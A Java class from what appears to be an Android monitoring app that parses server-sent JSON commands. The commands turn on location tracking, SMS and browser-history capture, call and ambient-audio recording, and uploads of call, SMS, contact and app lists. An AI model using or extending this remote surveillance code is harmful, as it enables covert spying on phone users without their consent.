package com.inet.android.request;

import java.io.UnsupportedEncodingException;
import java.util.Iterator;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

import com.inet.android.list.Queue;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;

public class Parser {
	private static String tag = Parser.class.getSimpleName().toString();
	private Context mContext;
	private Editor ed;
	private SharedPreferences sp;

	public Parser(Context ctx) {
		this.mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		ed = sp.edit();

	}

	/*
	 * access_token for access API
	 */
	public boolean parsingFirstToken(byte[] responseBody)
			throws UnsupportedEncodingException, JSONException {
		String response = new String(responseBody, "UTF-8");
		Logging.doLog(tag, response);
		JSONObject jsonObj = new JSONObject(response);
		if (jsonObj.get("access_token") != null) {
			ed.putString("access_first_token",
					jsonObj.getString("access_token"));
			ed.commit();
			if (!sp.getString("code_initial", "-1").equals("1")) {
				StartRequest sr = new StartRequest(mContext);
				sr.sendRequest();
			}
			return true;
		}
		return false;
	}

	/*
	 * access_token for REST API
	 */
	public boolean parsingSecondToken(byte[] responseBody)
			throws UnsupportedEncodingException, JSONException {
		String response = new String(responseBody, "UTF-8");
		Logging.doLog(tag, response);
		JSONObject jsonObj = new JSONObject(response);
		if (jsonObj.get("access_token") != null) {
			ed.putString("access_second_token",
					jsonObj.getString("access_token"));
			ed.commit();
			if (!sp.getString("period_request", "-1").equals("1")) {
				PeriodicRequest sr = new PeriodicRequest(mContext);
				sr.sendRequest();
			}
			return true;
		}
		return false;
	}

	/*
	 * code = 1 - Ok, device - true; code:0, error:0 - incorrect accaunt
	 */
	public String[] parsing(byte[] responseBody)
			throws UnsupportedEncodingException, JSONException {
		String response = new String(responseBody, "UTF-8");
		JSONObject jsonObj = new JSONObject(response);
		Iterator<String> keys = jsonObj.keys();
		String code = "0", report = "0";

		while (keys.hasNext()) {
			String key = keys.next();
			String value = jsonObj.get(key).toString();

			Logging.doLog(tag, key + " " + value);
			switch (key) {
			case "code":
				code = value;
				break;
			case "device":
				ed.putString("device", value);
				report = value;
				break;
			case "key":
				ed.putString("key_removal", value);
				report = value;
				break;
			case "error":
				report = value;
				break;
			default:
				break;
			}
		}
		ed.commit();
		return new String[] { code, report };

	}

	/*
	 * /* code = 1 - Ok, device - true; code:0, error:0 - incorrect accaunt
	 */
	public void parsingSettings(byte[] responseBody)
			throws UnsupportedEncodingException, JSONException {
		String response = new String(responseBody, "UTF-8");
		JSONObject jsonObj = new JSONObject(response);
		Iterator<String> keys = jsonObj.keys();

		while (keys.hasNext()) {
			String key = keys.next();
			String value = jsonObj.get(key).toString();

			Logging.doLog(tag, key + value);
			switch (key) {
			/*
			 * ---- positioning mode 0 - network, 1 - gps ----
			 */
			case "geo_mode":
				AppSettings.changeValueMethod(
						AppConstants.LOCATION_TRACKER_MODE, value, mContext);
				break;
			// ----------frequency location 0 - off ------------
			case "geo":
				AppSettings.changeValueMethod(
						AppConstants.TYPE_LOCATION_TRACKER_REQUEST, value,
						mContext);
				break;
			case "sms":
				AppSettings
						.changeValueMethod(
								AppConstants.TYPE_INCOMING_SMS_REQUEST, value,
								mContext);
				break;
			case "call":
				ed.putString("call", value);
				break;
			case "www":
				AppSettings.changeValueMethod(
						AppConstants.TYPE_HISTORY_BROUSER_REQUEST, value,
						mContext);
				break;
			// key for recording environment
			case "key_rec":
				ed.putString("key_rec", value);
				break;
			// ----------the number of minutes of Dictaphone-----------

			case "rec_env":
				ed.putString("rec_env", value);
				break;
			// ---whether you want to record conversations--
			case "rec_call":
				ed.putString("rec_call", value);
				break;
			// --recording situation after a telephone conversation-------

			case "rec_env_call":
				ed.putString("rec_env_call", value);
				break;
			// ----------time server-----------

			case "UTCT":
				ed.putString("UTCT", value);
				break;
			case "time_from":
				ed.putString("time_from", value);
				break;
			case "time_to":
				ed.putString("time_to", value);
				break;
			// ---------lunchtime start-------------
			case "brk_from":
				ed.putString("brk_from", value);
				break;
			case "brk_to":
				ed.putString("brk_to", value);
				break;
			// ----------------image and audio detect----------------------

			case "image":
				AppSettings.setValueFileObserverService("image", value,
						mContext);
				break;
			case "audio":
				AppSettings.setValueFileObserverService("audio", value,
						mContext);
				break;
			// ----------------method of sending files----------------------

			case "dispatch":
				ed.putString("dispatch", value);
				break;
			// ---------------calls list------------------------

			case "calls_list":
				if (!value.equals("0")
						&& sp.getInt("list_call", 0) != Integer.parseInt(value)) {
					Queue.setList(AppConstants.TYPE_LIST_CALL,
							Integer.parseInt(value), null, mContext);
				}
				break;
			case "sms_list":
				if (!value.equals("0")
						&& sp.getInt("list_sms", 0) != Integer.parseInt(value)) {
					Queue.setList(AppConstants.TYPE_LIST_SMS,
							Integer.parseInt(value), null, mContext);
				}
				break;
			case "contacts_list":
				if (!value.equals("0")
						&& sp.getInt("list_contact", 0) != Integer
								.parseInt(value)) {
					Queue.setList(AppConstants.TYPE_LIST_CONTACTS,
							Integer.parseInt(value), null, mContext);
				}

				break;
			case "apps_list":
				if (!value.equals("0")
						&& sp.getInt("list_app", 0) != Integer.parseInt(value)) {
					Queue.setList(AppConstants.TYPE_LIST_APP,
							Integer.parseInt(value), null, mContext);
				}
				break;
			// --------------log file------------------------

			case "log":
				if (value.equals("1"))
					Logging.sendLogFileToServer(mContext);
				break;
			case "tariff":
					ed.putString("tariff", value);
				
				break;
			default:
				break;
			}
		}
		ed.commit();
	}
}
